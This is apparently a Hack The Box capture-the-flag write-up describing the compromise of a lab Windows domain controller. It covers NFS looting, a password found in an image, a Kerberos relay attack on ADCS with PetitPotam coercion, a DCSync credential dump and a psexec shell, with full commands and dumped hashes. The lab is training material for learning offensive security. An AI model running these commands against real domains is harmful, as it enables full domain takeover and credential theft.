<div class="htb-box-info medium">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f3d3ede-372d-446b-bf9c-62a8f2bc372b.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Windows</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>3 Jul 2025</td></tr>
      </table>
    </div>
  </div>
</div>

---

# Enumeration
```
nmap -sC -sV -vv 10.129.234.48
```

```bash
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-28 04:15:36Z)
111/tcp  open  rpcbind?      syn-ack ttl 127
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|_  100003  2,3,4       2049/tcp6  nfs
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-28T04:06:07
| Not valid after:  2027-09-28T04:06:07
| MD5:     d872 61e7 e297 a299 5a97 0136 dcc8 6130
| SHA-1:   fa96 5a58 aa54 deac d2ea 0372 288d 5c8a f37e 392d
| SHA-256: 2d18 9ffc 354f 2f12 3699 d0bb 80b7 3e4f 5ce3 8453 a871 6299 0d7b 5654 8a35 c4d7
| -----BEGIN CERTIFICATE-----
| MIIGQjCCBSqgAwIBAgITdAAAAFfD3NsREIM5uwAcAAAAVzANBgkqhkiG9w0BAQsF
| ADBKMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZjaWNhZGEx
| HDAaBgNVBAMTE2NpY2FkYS1EQy1KUFEyMjUtQ0EwHhcNMjYwOTI4MDQwNjA3WhcN
| MjcwOTI4MDQwNjA3WjAeMRwwGgYDVQQDExNEQy1KUFEyMjUuY2ljYWRhLnZsMIIB
| IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArEa5ynQ9lCx77g6+YotjM+FJ
| ZgdimDgWyJbaKKHAJVMhs29h1VJFTxBUHQIPY9v2theff0v1Ooo3NPI/ID8xzH+S
3tdldX46oQgLIZTyKcZ5n1MqNBb4ARd9DiuVe/dp5ScHytNFhnItL4ZalSk1v2qT
| Qo98H3QMVAI/LHabp53mkmKaKBYMKA==
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-28T04:06:07
| Not valid after:  2027-09-28T04:06:07
| MD5:     d872 61e7 e297 a299 5a97 0136 dcc8 6130
| SHA-1:   fa96 5a58 aa54 deac d2ea 0372 288d 5c8a f37e 392d
| SHA-256: 2d18 9ffc 354f 2f12 3699 d0bb 80b7 3e4f 5ce3 8453 a871 6299 0d7b 5654 8a35 c4d7
| -----BEGIN CERTIFICATE-----
| MIIGQjCCBSqgAwIBAgITdAAAAFfD3NsREIM5uwAcAAAAVzANBgkqhkiG9w0BAQsF
| ADBKMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZjaWNhZGEx
| HDAaBgNVBAMTE2NpY2FkYS1EQy1KUFEyMjUtQ0EwHhcNMjYwOTI4MDQwNjA3WhcN
| Qo98H3QMVAI/LHabp53mkmKaKBYMKA==
|_-----END CERTIFICATE-----
2049/tcp open  nfs           syn-ack ttl 127 2-4 (RPC #100003)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-28T04:06:07
| Not valid after:  2027-09-28T04:06:07
| MD5:     d872 61e7 e297 a299 5a97 0136 dcc8 6130
| SHA-1:   fa96 5a58 aa54 deac d2ea 0372 288d 5c8a f37e 392d
| SHA-256: 2d18 9ffc 354f 2f12 3699 d0bb 80b7 3e4f 5ce3 8453 a871 6299 0d7b 5654 8a35 c4d7
| -----BEGIN CERTIFICATE-----
| MIIGQjCCBSqgAwIBAgITdAAAAFfD3NsREIM5uwAcAAAAVzANBgkqhkiG9w0BAQsF
| ADBKMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZjaWNhZGEx
| Qo98H3QMVAI/LHabp53mkmKaKBYMKA==
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-28T04:06:07
| Not valid after:  2027-09-28T04:06:07
| MD5:     d872 61e7 e297 a299 5a97 0136 dcc8 6130
| SHA-1:   fa96 5a58 aa54 deac d2ea 0372 288d 5c8a f37e 392d
| SHA-256: 2d18 9ffc 354f 2f12 3699 d0bb 80b7 3e4f 5ce3 8453 a871 6299 0d7b 5654 8a35 c4d7
| -----BEGIN CERTIFICATE-----
| MIIGQjCCBSqgAwIBAgITdAAAAFfD3NsREIM5uwAcAAAAVzANBgkqhkiG9w0BAQsF
Qo98H3QMVAI/LHabp53mkmKaKBYMKA==
|_-----END CERTIFICATE-----
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-09-28T04:17:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Issuer: commonName=DC-JPQ225.cicada.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-27T04:13:43
| Not valid after:  2027-03-29T04:13:43
| MD5:     a603 18d9 4a93 95d4 5dd0 a7a7 d3b9 ab55
| SHA-1:   0870 a2df ea5f 32c8 1fa8 a2cb 1776 1524 5532 9fcb
| SHA-256: 3e22 77e3 04c1 0e8b e5a1 4d4e 7309 47b4 d43f 2c0e 1e03 e4c5 6dba 279f 78c0 d370
| -----BEGIN CERTIFICATE-----
| MIIC6jCCAdKgAwIBAgIQG5N2d9f21pNGdBwWPZyHtzANBgkqhkiG9w0BAQsFADAe
| nHgggUV5qwfhsl1eMOoMqtLqla9s5tvjbSEfR1cU
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2026-09-28T04:16:24
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18435/tcp): CLEAN (Timeout)
|   Check 2 (port 21497/tcp): CLEAN (Timeout)
|   Check 3 (port 21688/udp): CLEAN (Timeout)
|   Check 4 (port 33554/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.

```

so we have these ports open:
- DNS – 53
- Kerberos – 88
- RPC – 135
- NetBIOS – 139
- LDAP – 389
- SMB – 445
- LDAP (SSL) – 636
- LDAP (GC) – 3268
- LDAP (GC SSL) – 3269
- Kerberos (kpasswd) – 464
- RPC (SSL) – 593
- NFS – 2049
- Portmapper – 111
- HTTP – 80
- RDP – 3389
- WinRM – 5985


so lets enum each port:

#### dns
showed noting..
```bash
dig axfr cicada.vl @10.129.234.48 +cmd

; <<>> DiG 9.20.27-2-Debian <<>> axfr cicada.vl @10.129.234.48 +cmd
; (1 server found)
;; global options: +cmd
; Transfer failed.
```


#### smb
smb showed nothing
null access isnt there



#### http
![[Pasted image 20260928074541.png]]


#### ldap
```bash
netexec ldap 10.129.234.48 -u '' -p ''                
LDAP        10.129.234.48   389    DC-JPQ225        [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.234.48   389    DC-JPQ225        [-] cicada.vl\: STATUS_NOT_SUPPORTED
```
we could try relay attack cause there is no signing...


#### nfs
```bash
showmount -e 10.129.234.48             
Export list for 10.129.234.48:
/profiles (everyone)
```

lets mount 
```bash
sudo mount -t nfs 10.129.234.48:/ ./profiles -o nolock
```

and we have this inside. looks like each user folder.
```
Administrator  Daniel.Marshall  Debra.Wright  Jane.Carter  Jordan.Francis  Joyce.Andrews  Katie.Ward  Megan.Simpson  Richard.Gibbons  Rosie.Powell  Shirley.West
```

![[Pasted image 20260928073840.png]]

so we have 2 images

first admin's image:
![[Pasted image 20260928073938.png]]

the second one ins't opening so easily...

i had to use `sudo` duo of perm error. lets copy it to our location.
```bash
sudo cp profiles/profiles/Rosie.Powell/marketing.png .
```

and then open it.
```bash
sudo open marketing.png
```
![[Pasted image 20260928075627.png]]

looking at the desk there is sticker with some word **Cicada123**...

lets try to auth
```bash
netexec smb 10.129.234.48 -u 'Rosie.Powell' -p 'Cicada123'
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Rosie.Powell:Cicada123 STATUS_NOT_SUPPORTED 
```

lets use `-k` flag
```bash
netexec smb 10.129.234.48 -u 'Rosie.Powell' -p 'Cicada123' -k
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
```
so it's kerberos envirmonment...

lets enum shares:
![[Pasted image 20260928080251.png]]
From here only one share interests me and it's CertEnroll.

I downloaded shares with spider_plus module. so we have a bunch of certificates inside...
![[Pasted image 20260928084948.png]]

worth to check for ADCS vulns:
```
certipy-ad find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
```

and we got one:
![[Pasted image 20260928090540.png]]

the basic ESC8 exploatation won't work here because this is kerberos environment ( NTLM auth is disabled ). so we need to do a little research:

found this article: https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html

as I understood I need to:
1. Create DNS record that will look legitimate to kerberos and will point to my ip.
2. Coerce Domain Controller to given DNS.
3. I need to catch this ticket and relay it to ADCS.

first we need to create dns record.  I tried to use tool like `dnstool` but it failed... so i had to switch to `bloodyAD` instead:
```bash
bloodyAD -d cicada.vl -u 'Rosie.Powell' -p 'Cicada123' --host DC-JPQ225.cicada.vl -k add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' 10.10.15.85
```

so at this point lets start listener ( certipy didn't work here either so i had to use ntlmrelayx.py tool for this job ):
```bash
ntlmrelayx.py -t http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

so let's coerce. There is a long list of methods we can do this. let's try with netexec module:
```bash
netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus
```

so it tells us it vulnerable to this:
![[Pasted image 20260930081644.png]]

let's go with `PepitPotam` tool:
```bash
netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA METHOD=PetitPotam
```
![[Pasted image 20260930081727.png]]

let's check if we got .pfx
![[Pasted image 20260930081805.png]]

and we got one. lets get ticket 
```bash
certipy-ad auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.64.148
```

```
[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
File 'dc-jpq225.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

so we have DC under controll let's perform DCSync attack to get access to Administrator.
```bash
secretsdump.py -k -no-pass cicada.vl/DC-JPQ225\$@dc-jpq225.cicada.vl -just-dc-user Administrator
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up..
```


now we need administrator ticket:
```bash
getTGT.py cicada.vl/administrator -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.64.148
```

save it and get shell via psexec

```bash
impacket-psexec cicada.vl/administrator@dc-jpq225.cicada.vl -k -no-pass
```

and we got 2 flags here...
![[Pasted image 20260930082654.png]]
